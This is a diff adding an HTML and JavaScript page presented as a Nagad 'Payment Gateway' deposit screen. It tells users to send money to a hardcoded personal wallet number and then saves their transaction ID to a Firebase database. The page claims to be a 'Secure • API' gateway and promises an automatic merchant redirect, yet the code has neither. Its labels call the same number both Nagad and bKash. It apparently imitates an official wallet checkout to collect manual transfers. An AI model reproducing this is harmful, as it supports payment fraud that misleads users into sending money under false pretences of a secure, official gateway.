@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Payment Gateway</title>
+<style>
+:root{--green:#087b58;--pink:linear-gradient(100deg,#f58220 0%,#ed1c24 100%);--blue:#3474e9;--ink:#26334a;--muted:#78818e;--line:#e7eaf0}
+*{box-sizing:border-box;margin:0;padding:0;font-family:Arial,"Noto Sans Bengali",sans-serif}
+body{background:#f4f6fa;color:var(--ink)}
+.container{max-width:450px;min-height:100vh;margin:auto;background:#f7f8fa}
+.header{min-height:96px;background:#087b58;color:#fff;padding:12px 16px;display:flex;align-items:flex-start;justify-content:space-between;gap:8px}
+.header-left{display:flex;flex-direction:column;gap:8px;max-width:54%}
+.header-left .amount{font-size:20px;font-weight:800;display:block;white-space:nowrap}
+.header-left .sub{font-size:13px;line-height:1.45;display:block;margin-top:0;font-weight:600}
+.header-right{padding-top:4px}
+.header-left .amount{font-size:20px;font-weight:800;display:block}
+.header-left .sub{font-size:10px;display:block;margin-top:2px}
+.header-right{font-size:12px;font-weight:800;display:flex;gap:6px;align-items:center}.lang-btn{border:1px solid #ffffff80;border-radius:4px;padding:4px 6px;background:transparent;color:#fff;font-size:10px;font-weight:800}.lang-btn.active{background:#fff;color:#087b58}.lang-switch{display:flex;gap:3px;align-items:center}
+.pay-label{background:#fff;color:#087b58;border-radius:4px;padding:4px 6px}
+.content{padding:20px 20px 32px}
+.page{display:none}.page.active{display:block}
+.amount-card{background:linear-gradient(135deg,#3478ee,#245bc5);color:#fff;border-radius:10px;padding:16px 15px;margin:0 0 11px;box-shadow:0 3px 8px #1e55b51c}
+.amount-caption{font-size:11px;color:#dbe8ff}
+.amount-value{font-size:25px;font-weight:800;margin:3px 0 8px;animation:softBounce 2.2s ease-in-out infinite}@keyframes softBounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-3px)}}.summary-head span:first-child,.field-title,.send-title{animation:softBounce 2.8s ease-in-out infinite}
+.order-code{font-size:10px;line-height:1.45;overflow-wrap:anywhere}
+.pending-pill{display:inline-block;background:#f5d77a;color:#664b00;padding:2px 7px;border-radius:12px;font-size:9px;font-weight:800;margin-top:3px}
+.provider{height:54px;border-radius:10px;background:var(--pink);color:#fff;display:flex;align-items:center;padding:8px 12px;gap:10px;font-weight:800;font-size:15px;margin-bottom:11px}
+.provider-logo{width:34px;height:34px;border-radius:50%;background:#fff;overflow:hidden;display:grid;place-items:center;flex-shrink:0}
+.provider-logo img{width:100%;height:100%;object-fit:cover}
+.continue-wrap{padding:12px;background:#fff;border-radius:9px;margin-bottom:25px}
+.continue-btn{height:42px;width:100%;border:0;border-radius:6px;background:var(--blue);color:#fff;font-size:13px;font-weight:800}
+.summary{background:#fff;border-radius:9px;padding:13px 12px;box-shadow:0 2px 9px #1d29390b}
+.summary-head{display:flex;justify-content:space-between;align-items:center;font-size:13px;font-weight:800;margin-bottom:9px}
+.secure{font-size:9px;color:#52709e;border:1px solid #a9bddc;border-radius:12px;padding:3px 8px}
+.summary-body{font-size:12px;line-height:1.55;color:#536074;border-bottom:1px solid #edf0f4;padding-bottom:8px;overflow-wrap:anywhere}
+.summary-notes{font-size:10px;color:#7c8490;line-height:1.45;padding-top:9px}
+.summary-notes div{margin-bottom:3px}
+.warning{background:#fff5f5;border:1px solid #f4cccc;color:#c92d2d;text-align:center;font-size:16px;font-weight:700;line-height:1.55;padding:16px 12px;margin-bottom:22px;animation:redBounce 1.35s ease-in-out infinite;transform-origin:center}
+@keyframes redBounce{0%,100%{transform:translateY(0)}25%{transform:translateY(-4px)}50%{transform:translateY(0)}75%{transform:translateY(-2px)}}
+.field-title{font-size:17px;font-weight:800;margin:18px 0 10px}
+.hint{font-size:14px;color:#777f89;margin-bottom:10px}
+.wallet-number{height:56px;background:#fff;border:1px solid #e1e3e7;border-radius:8px;display:flex;align-items:center;padding-left:14px;font-size:19px;font-weight:700}
+.copy-btn{margin-left:auto;height:40px;width:40px;border:0;background:#fff;border-left:1px solid #eee;display:grid;place-items:center}
+.copy-btn img{width:23px;height:23px;object-fit:contain}
+.trx-label{display:block;font-size:17px;font-weight:800;color:#343b47;margin:24px 0 12px}
+.trx-input{width:100%;height:58px;border:2px solid #d83b3b;border-radius:8px;padding:0 16px;background:#fff;font-size:17px;outline:none}
+.confirm-btn{width:100%;height:58px;border:1px solid #bfc3c8;border-radius:32px;background:#fff;color:#888;font-size:18px;margin-top:12px}
+.confirm-btn:enabled{background:#fff;color:#555}
+.instruction-image{display:block;width:100%;height:auto;object-fit:contain;margin:20px 0 12px;background:#fff}
+.send-title{text-align:center;color:#bd2028;font-weight:900;font-size:26px;margin:12px 0 30px;animation:redBounce 1.35s ease-in-out infinite}.method-icons{display:grid;grid-template-columns:repeat(4,1fr);gap:7px;margin:14px 0 10px}.method-item{background:#fff;border:1px solid #e8eaf0;border-radius:7px;min-height:66px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;font-size:9px;color:#536071;text-align:center}.method-item:first-child{border:2px solid #df4b61;position:relative}.method-item:first-child:after{content:"↙";position:absolute;right:3px;top:-12px;color:#df344b;font-size:20px;font-weight:900}.method-icon{font-size:22px;line-height:1}
+.caution{border-top:1px solid #e1e1e1;padding-top:22px;font-size:18px;font-weight:900}
+.caution-text{font-size:16px;color:#c52b2b;font-weight:700;line-height:1.65;margin-top:10px;animation:redBounce 1.5s ease-in-out infinite}
+.caution-detail{font-size:15px;color:#777f89;line-height:1.7;margin-top:24px}
+.receipt-overlay{display:none;position:fixed;inset:0;background:#0009;z-index:99;align-items:center;justify-content:center;padding:15px}
+.receipt-overlay.active{display:flex}
+.receipt{width:100%;max-width:355px;background:#fff;border-radius:12px;padding:20px 17px;text-align:center}
+.receipt img{width:72px;height:72px;object-fit:contain;margin-bottom:7px}
+.receipt h2{font-size:19px;color:#087b58;margin-bottom:7px}
+.receipt p{font-size:12px;line-height:1.5;color:#6e7784}
+.receipt-data{background:#f5f7f8;border-radius:7px;padding:12px;margin:12px 0;text-align:left}
+.receipt-row{display:flex;justify-content:space-between;gap:10px;font-size:11px;margin-bottom:9px}
+.receipt-row:last-child{margin-bottom:0}
+.receipt-row strong{text-align:right;overflow-wrap:anywhere;max-width:60%}
+.pending{color:#b77b0a}
+.done{width:100%;height:42px;border:0;border-radius:6px;background:#087b58;color:#fff;font-weight:800;margin-top:13px}
+@media(max-width:360px){.content{padding:10px}.amount-value{font-size:23px}}
+</style>
+</head>
+<body>
+<div class="container">
+ <header class="header" id="mainHeader" style="display:none">
+  <div class="header-left"><span class="amount" id="topAmount">BDT 100.00</span><span class="sub" data-i18n="headerSub">পেমেন্ট সম্পন্ন করতে নির্দেশনা অনুসরণ করুন</span></div>
+  <div class="header-right"><span>PAY SERVICE</span><div class="lang-switch"><button class="lang-btn" id="langEn" type="button">EN</button><button class="lang-btn active" id="langBn" type="button">বাংলা</button></div></div>
+ </header>
+ <main class="content">
+  <section class="page active" id="summaryPage">
+   <div class="amount-card">
+    <div class="amount-caption">Amount to pay</div>
+    <div class="amount-value" id="cardAmount">BDT 100.00</div>
+    <div class="order-code">Order <span id="orderCode"></span></div>
+    <span class="pending-pill">PENDING</span>
+   </div>
+   <div class="provider"><div class="provider-logo"><img src="https://files.catbox.moe/06rpu2.png" alt="Nagad"></div><span>Nagad Deposit</span></div>
+   <div class="continue-wrap"><button class="continue-btn" id="continueBtn">Continue to Payment</button></div>
+   <div class="summary">
+    <div class="summary-head"><span data-i18n="orderSummary">Order Summary</span><span class="secure">Secure • API</span></div>
+    <div class="summary-body"><span data-i18n="orderId">Order ID</span>: <strong id="summaryOrder"></strong><br><span data-i18n="amount">Amount</span>: <strong id="summaryAmount"></strong><br><span data-i18n="gateway">Gateway</span>: Nagad</div>
+    <div class="summary-notes">
+     <div data-i18n="note1">• After clicking Pay, please open your wallet and enter your password to complete the payment.</div>
+     <div data-i18n="note2">• After paid or failed, you'll be redirected to merchant website automatically.</div>
+     <div data-i18n="note3">• After clicking Pay, if you want to change your account for payment, please wait for one minute before trying again with a new account.</div>
+    </div>
+   </div>
+  </section>
+  <section class="page" id="paymentPage">
+   <div class="warning"><span data-i18n="warningStart">আপনি যদি টাকার পরিমাণ পরিবর্তন করেন</span> (<span id="warnAmount">BDT 100.00</span>)<span data-i18n="warningEnd">, আপনি ক্রেডিট পেতে সক্ষম হবেন না।</span></div>
+   <div class="field-title" data-i18n="walletProvider">Wallet Provider</div>
+   <div class="provider"><div class="provider-logo"><img src="https://files.catbox.moe/06rpu2.png" alt="Nagad"></div><span data-i18n="nagadDeposit">Nagad Deposit</span></div>
+   <div class="field-title"><span data-i18n="walletNo">Wallet No</span> <span style="color:#e44">*</span></div>
+   <div class="hint" data-i18n="walletHint">এই NAGAD নাম্বারে শুধুমাত্র সেন্ড মানি গ্রহণ করা হয়</div>
+   <div class="wallet-number"><span id="walletNumberDisplay">01765943426</span><button type="button" class="copy-btn" id="copyBtn" aria-label="Copy number"><img src="https://cdn-icons-png.flaticon.com/512/1621/1621635.png" alt="Copy"></button></div>
+   <form id="depositSubmitForm">
+    <label class="trx-label" for="trxInput"><span data-i18n="trxLabel">কনফার্মেশনের TrxID নাম্বারটি লিখুন</span> <span style="color:#e34b4b" data-i18n="required">(প্রয়োজনীয়)</span></label>
+    <input type="text" id="trxInput" class="trx-input" placeholder="TrxID অবশ্যই পূরণ করতে হবে!" data-i18n-placeholder="trxPlaceholder" required autocomplete="off">
+    <button type="submit" class="confirm-btn" id="submitBtn" disabled data-i18n="submit">নিশ্চিত</button>
+   </form>
+   <img class="instruction-image" src="https://files.catbox.moe/6flnui.webp" alt="পেমেন্ট করার নিয়ম" style="width:100%;height:auto;max-height:150px;object-fit:contain;margin:13px 0 7px">
+   <div class="send-title" data-i18n="sendMoneyBn">সেন্ড মানি</div>
+   <div class="caution" data-i18n="caution">সতর্কতা:</div>
+   <div class="caution-text" data-i18n="cautionText">লেনদেন আইডি সঠিকভাবে পূরণ করতে হবে, অন্যথায় স্কোর ব্যর্থ হবে!</div>
+   <div class="caution-detail" data-i18n="cautionDetail">অনুগ্রহ করে নিশ্চিত হয়ে নিন যে আপনি NAGAD deposit ওয়ালেট নাম্বারে সেন্ড মানি করছেন। এই নাম্বারের অন্য কোনো ওয়ালেট থেকে সেন্ড মানি করলে সেই টাকা পাওয়ার কোনো সম্ভাবনা নাই।</div>
+  </section>
+ </main>
+</div>
+<div class="receipt-overlay" id="successModal" role="dialog" aria-modal="true">
+ <div class="receipt">
+  <img src="https://files.catbox.moe/6ttmck.png" alt="Success">
+  <h2 data-i18n="orderSubmitted">Order Submitted</h2>
+  <p data-i18n="successText">আপনার Transaction ID জমা হয়েছে। পেমেন্ট যাচাই সম্পন্ন হলে স্ট্যাটাস আপডেট হবে।</p>
+  <div class="receipt-data">
+   <div class="receipt-row"><span>Order ID</span><strong id="receiptOrder">---</strong></div>
+   <div class="receipt-row"><span>Amount</span><strong id="receiptAmount">---</strong></div>
+   <div class="receipt-row"><span>Payment Method</span><strong>Nagad</strong></div>
+   <div class="receipt-row"><span>Transaction ID</span><strong id="receiptTrx">---</strong></div>
+   <div class="receipt-row"><span>Date</span><strong id="receiptDate">---</strong></div>
+   <div class="receipt-row"><span>Status</span><strong class="pending" id="receiptStatus">PENDING</strong></div>
+  </div>
+  <p>এই রিসিটটি অনুরোধ জমা হওয়ার প্রমাণ; এটি পেমেন্ট নিশ্চিত হওয়ার প্রমাণ নয়।</p>
+  <button type="button" class="done" id="finalDoneBtn" data-i18n="continue">Continue</button>
+ </div>
+</div>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+const translations={
+ en:{headerSub:"Do not transfer more or less Send Money",warningStart:"If you change the payment amount",warningEnd:", you may not receive the credit.",nagadDeposit:"Nagad Deposit",orderSubmitted:"Order Submitted",successText:"Your Transaction ID has been submitted. The status will update after payment verification.",continue:"Continue",orderSummary:"Order Summary",orderId:"Order ID",amount:"Amount",gateway:"Gateway",note1:"• After clicking Pay, open your wallet and enter your password to complete the payment.",note2:"• After payment succeeds or fails, you will be redirected to the merchant website automatically.",note3:"• To change your payment account, wait one minute before trying again with a new account.",walletProvider:"Wallet Provider",walletNo:"Wallet No",walletHint:"Only Send Money is accepted to this Nagad number.",trxLabel:"Enter the confirmation TrxID",required:"(Required)",trxPlaceholder:"Please enter your TrxID!",submit:"Submit",sendMoney:"Send Money",cashOut:"Cash Out",payBill:"Pay Bill",addMoney:"Add Money",sendMoneyBn:"Send Money",caution:"Caution",cautionText:"Enter the transaction ID correctly, otherwise the score will fail!" ,cautionDetail:"Please make sure you are sending money to the NAGAD deposit wallet number. If you send money from another wallet to this number, there is no possibility of receiving that money."},
+ bn:{headerSub:"কম বা বেশি করবেন না সেন্ড মানি",warningStart:"আপনি যদি টাকার পরিমাণ পরিবর্তন করেন",warningEnd:", আপনি ক্রেডিট পেতে সক্ষম হবেন না।",nagadDeposit:"নগদ ডিপোজিট",orderSubmitted:"অর্ডার জমা হয়েছে",successText:"আপনার Transaction ID জমা হয়েছে। পেমেন্ট যাচাই সম্পন্ন হলে স্ট্যাটাস আপডেট হবে।",continue:"চালিয়ে যান",orderSummary:"অর্ডার সারাংশ",orderId:"অর্ডার আইডি",amount:"পরিমাণ",gateway:"পেমেন্ট মাধ্যম",note1:"• Pay চাপার পর আপনার ওয়ালেট খুলে পাসওয়ার্ড দিয়ে পেমেন্ট সম্পন্ন করুন।",note2:"• পেমেন্ট সফল বা ব্যর্থ হলে আপনাকে স্বয়ংক্রিয়ভাবে মার্চেন্ট ওয়েবসাইটে ফেরত পাঠানো হবে।",note3:"• পেমেন্ট অ্যাকাউন্ট পরিবর্তন করতে চাইলে নতুন অ্যাকাউন্ট দিয়ে চেষ্টা করার আগে এক মিনিট অপেক্ষা করুন।",walletProvider:"ওয়ালেট প্রোভাইডার",walletNo:"ওয়ালেট নম্বর",walletHint:"এই বিকাশ নম্বরে শুধুমাত্র সেন্ড মানি গ্রহণ করা হয়।",trxLabel:"কনফার্মেশনের TrxID নাম্বারটি লিখুন",required:"(প্রয়োজনীয়)",trxPlaceholder:"TrxID অবশ্যই পূরণ করতে হবে!",submit:"নিশ্চিত",sendMoney:"সেন্ড মানি",cashOut:"ক্যাশ আউট",payBill:"পে বিল",addMoney:"অ্যাড মানি",sendMoneyBn:"সেন্ড মানি",caution:"সতর্কতা",cautionText:"লেনদেন আইডি সঠিকভাবে পূরণ করতে হবে, অন্যথায় স্কোর ব্যর্থ হবে!",cautionDetail:"অনুগ্রহ করে নিশ্চিত হয়ে নিন যে আপনি NAGAD deposit ওয়ালেট নাম্বারে সেন্ড মানি করছেন। এই নাম্বারের অন্য কোনো ওয়ালেট থেকে সেন্ড মানি করলে সেই টাকা পাওয়ার কোনো সম্ভাবনা নাই।"}
+};
+function setLanguage(lang){document.documentElement.lang=lang;document.querySelectorAll("[data-i18n]").forEach(el=>{const k=el.dataset.i18n;if(translations[lang][k])el.textContent=translations[lang][k];});document.querySelectorAll("[data-i18n-placeholder]").forEach(el=>{const k=el.dataset.i18nPlaceholder;el.placeholder=translations[lang][k]||el.placeholder;});document.getElementById("langEn").classList.toggle("active",lang==="en");document.getElementById("langBn").classList.toggle("active",lang==="bn");}
+document.getElementById("langEn").addEventListener("click",()=>setLanguage("en"));
+document.getElementById("langBn").addEventListener("click",()=>setLanguage("bn"));
+setLanguage("bn");
+const firebaseConfig = {
+          apiKey: "AIzaSyAy9PPm5UJpuhxfuPhNgqsUOOBFXXlmzU8",
+          authDomain: "pay-admin-98aca.firebaseapp.com",
+          databaseURL: "https://pay-admin-98aca-default-rtdb.firebaseio.com",
+          projectId: "pay-admin-98aca",
+          storageBucket: "pay-admin-98aca.firebasestorage.app",
+          messagingSenderId: "183780095284",
+          appId: "1:183780095284:web:c26822afd79efc4a826161",
+          measurementId: "G-B6EF5RW1WZ"
+        };
+const app=initializeApp(firebaseConfig);
+const db=getDatabase(app);
+const selectedNumber="01765943426";
+const params=new URLSearchParams(location.search);
+const amount=params.get("amount")||"100.00";
+const user=params.get("user")||"Guest";
+const orderId="AC"+Date.now()+Math.random().toString(36).slice(2,8).toUpperCase();
+const money="BDT "+amount;
+document.getElementById("topAmount").textContent=money;
+document.getElementById("cardAmount").textContent=money;
+document.getElementById("warnAmount").textContent=money;
+document.getElementById("summaryAmount").textContent=money;
+document.getElementById("orderCode").textContent=orderId;
+document.getElementById("summaryOrder").textContent=orderId;
+document.getElementById("walletNumberDisplay").textContent=selectedNumber;
+document.getElementById("continueBtn").addEventListener("click",()=>{
+ document.getElementById("summaryPage").classList.remove("active");
+ document.getElementById("paymentPage").classList.add("active");
+ document.getElementById("mainHeader").style.display="flex";
+ window.scrollTo(0,0);
+});
+const trxInput=document.getElementById("trxInput");
+const submitBtn=document.getElementById("submitBtn");
+trxInput.addEventListener("input",()=>{submitBtn.disabled=!trxInput.value.trim();});
+document.getElementById("copyBtn").addEventListener("click",async()=>{
+ try{
+  if(navigator.clipboard&&window.isSecureContext) await navigator.clipboard.writeText(selectedNumber);
+  else{const t=document.createElement("textarea");t.value=selectedNumber;document.body.appendChild(t);t.select();document.execCommand("copy");t.remove();}
+  alert("নাম্বার কপি হয়েছে: "+selectedNumber);
+ }catch(e){alert("নাম্বারটি হাতে কপি করুন: "+selectedNumber);}
+});
+document.getElementById("depositSubmitForm").addEventListener("submit",async e=>{
+ e.preventDefault();
+ const trxId=trxInput.value.trim();
+ if(!trxId)return;
+ submitBtn.disabled=true;submitBtn.textContent="প্রসেসিং...";
+ try{
+  const orderData={orderId,phone:user,amount,method:"NAGAD",receiver:selectedNumber,txid:trxId,status:"Pending",date:new Date().toLocaleString()};
+  await push(ref(db,"deposits"),orderData);
+  document.getElementById("receiptOrder").textContent=orderId;
+  document.getElementById("receiptAmount").textContent=money;
+  document.getElementById("receiptTrx").textContent=trxId;
+  document.getElementById("receiptDate").textContent=new Date().toLocaleString();
+  document.getElementById("successModal").classList.add("active");
+  trxInput.value="";
+ }catch(err){console.error(err);alert("অনুরোধ জমা হয়নি। ইন্টারনেট সংযোগ পরীক্ষা করে আবার চেষ্টা করুন।");}
+ finally{submitBtn.disabled=true;submitBtn.textContent="নিশ্চিত";}
+});
+document.getElementById("finalDoneBtn").addEventListener("click",()=>{
+ document.getElementById("successModal").classList.remove("active");
+});
+</script>
+</body>
+</html>
